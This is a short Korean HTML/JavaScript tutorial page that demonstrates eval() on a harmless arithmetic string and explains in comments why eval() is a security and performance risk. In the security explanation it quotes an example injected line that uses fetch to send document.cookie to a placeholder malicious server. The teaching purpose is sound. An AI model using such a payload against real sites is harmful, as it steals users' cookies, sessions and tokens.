<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>eval</title>
<link rel="icon" href="data:;base64,iVBORw0KGgo=">
</head>
<body>
	<h3>문자열을 자바스크립트 코드로 실행 - eval()</h3>

	<script type="text/javascript">
		var s;
		s = 'var a = 10, b = 5, c;';
		s += 'c = a + b;';
		s += 'alert(c);';

		// console.log(s); 
		// var a = 10, b = 5, c;c = a + b;alert(c);
		// 문자열의 내용을 보여줌 (디버깅용)

		eval(s);
		// 문자열을 자바스크립트 코드로 실행 (실제로 변수도 만들어지고 계산도 됨)
	</script>


<!-- CONCEPT -----------------------------------------------------------------------------------------------------------

	- 문자열을 자바스크립트 코드로 실행하는 방법 : eval()
		1. eval(string)
			- 문자열로 된 자바스크립트 코드를 실제 코드처럼 실행함
			- 변수 선언, 연산, 함수 실행 등 모두 가능

		2. 보안 및 성능 이슈 *****
			- 외부 입력값을 그대로 eval에 넘길 경우 보안 취약점 발생 가능
			- 실행 시점에 해석되므로 성능 저하 발생 가능성 있음

		3. 사용 주의
			- 가능한 경우 eval 사용은 피하는 것이 좋음
			- 대체 방법이 있는 경우 (ex. JSON.parse, 함수 직접 호출 등) 권장됨

	Q. 그렇다면 대체 왜 eval() 사용은 피하는 것이 좋을까?
		1. Security Risk
			- 문자열을 코드로 실행 -> 외부에서 입력된 문자열도 실행됨
				- 해커가 fetch('http://악성서버.com/steal?cookie=' + document.cookie) 같은 코드를 넣을 경우
					=> 쿠키, 세션 정보, 토큰까지 탈취당할 수 있음
					* 관련 설명
						- document.cookie -> 쿠키 정보 추출
						- fetch -> 해당 정보를 공격자가 만든 서버로 전송(악성서버.com)

		2. Performance Issue
			- javascript 엔진이 문자열을 해석하고 다시 컴파일해서 실행함
				=> 일반 코드보다 느리고 무겁게 동작
			- javascript 엔진은 static analysis를 통해 코드를 최적화함
				=> eval()은 실행 시점까지 코드 내용을 알 수 없어 최적화가 불가능함

		* 대안 방안
			1. 파싱이 필요할 때 -> JSON.parse()
			2. 동적으로 함수 실행이 필요할 때 -> Function() 또는 명시적 함수 호출
			3. 조건 분기나 동적 로딩이 필요할 때 -> import(), switch-case, map 등

		* 결론
			- 정말 꼭 필요할 때만, 내부적으로만, 완벽히 제어되는 상황에서만 사용해야 함

-------------------------------------------------------------------------------------------------------------------- -->

</body>
</html>